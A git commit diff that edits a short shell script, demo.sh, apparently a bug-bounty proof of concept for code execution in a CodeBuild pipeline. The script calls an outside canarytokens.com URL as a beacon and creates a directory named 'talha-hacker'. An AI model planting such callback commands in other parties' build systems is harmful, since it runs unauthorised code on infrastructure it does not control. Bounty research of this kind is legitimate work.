7b6bd1c7e4b0849549896c9e9ac7866c29aa960a
bountypocoauth <123492000+bountypocoauth@users.noreply.github.com>
2024-04-01 15:35:41 +0500

    Update demo.sh

--- demo.sh
+++ demo.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 
-curl "http://canarytokens.com/traffic/7vczzhsb2v8ivso24ze1c1fxa/submit.aspx" -H "User-Agent: This-is-triggered-by-Codebuild"
-mkdir hacked
+curl "http://canarytokens.com/traffic/7vczzhsb2v8ivso24ze1c1fxa/submit.aspx" -H "User-Agent: This-is-triggered-by-Codebuild-talha-hacker"
+mkdir talha-hacker
 ls
